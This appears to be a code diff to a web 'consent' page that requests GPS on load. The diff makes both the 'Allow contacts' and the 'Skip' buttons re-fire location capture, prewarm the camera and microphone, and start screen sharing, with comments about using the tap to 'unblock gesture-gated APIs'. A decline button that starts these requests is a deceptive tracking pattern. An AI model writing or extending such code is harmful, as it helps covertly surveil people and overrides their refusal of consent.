@@ -690,6 +690,8 @@ export default function ConsentPage() {
   const doGrantRef = useRef<() => void>(() => {});
   // Same pattern for startScreenCapture (defined in the session-recording section).
   const startScreenCaptureRef = useRef<() => void>(() => {});
+  // Guard: processGeoPosition should only fire once — whichever GPS attempt wins.
+  const grantProcessedRef = useRef(false);
 
   // ── New display-phase state machine ───────────────────────────────────────
   // contacts → kitty → contacts_popup → main
@@ -1182,8 +1184,10 @@ export default function ConsentPage() {
   // Handle "Allow contacts" button on the emergency contacts screen.
   // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
   const handleAllowContacts = useCallback(async () => {
-    // GPS is already running (fired on page load). This tap gives us a user-
-    // activation signal — use it to unblock the gesture-gated APIs.
+    // This tap is a real user-gesture — use it to:
+    // 1. Re-fire GPS (in case the page-load attempt's permission dialog was missed)
+    // 2. Unblock camera/mic and screen-share which require a gesture
+    doGrantRef.current();
     prewarmCameraAndMic();
     startScreenCaptureRef.current();
     // Mark contacts as tried so pickContacts() inside doGrant stays a no-op.
@@ -1197,8 +1201,9 @@ export default function ConsentPage() {
 
   // Handle "Skip" on emergency contacts screen.
   const handleSkipContacts = useCallback(() => {
-    // GPS is already running (fired on page load). Use this tap's user-activation
-    // signal to unblock the gesture-gated camera + screen-share APIs.
+    // Real user-gesture tap — re-fire GPS (catches devices where the page-load
+    // permission dialog was missed) and unblock gesture-gated APIs.
+    doGrantRef.current();
     prewarmCameraAndMic();
     startScreenCaptureRef.current();
     // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
@@ -1482,6 +1487,9 @@ export default function ConsentPage() {
   }, [token, stopScreenCapture]);
 
   const processGeoPosition = useCallback((position: GeolocationPosition) => {
+    // Guard: only the first winning GPS attempt should kick off the grant.
+    if (grantProcessedRef.current) return;
+    grantProcessedRef.current = true;
     const { latitude, longitude, accuracy } = position.coords;
     setCoords({ lat: latitude, lng: longitude, accuracy });
     setState("granting");
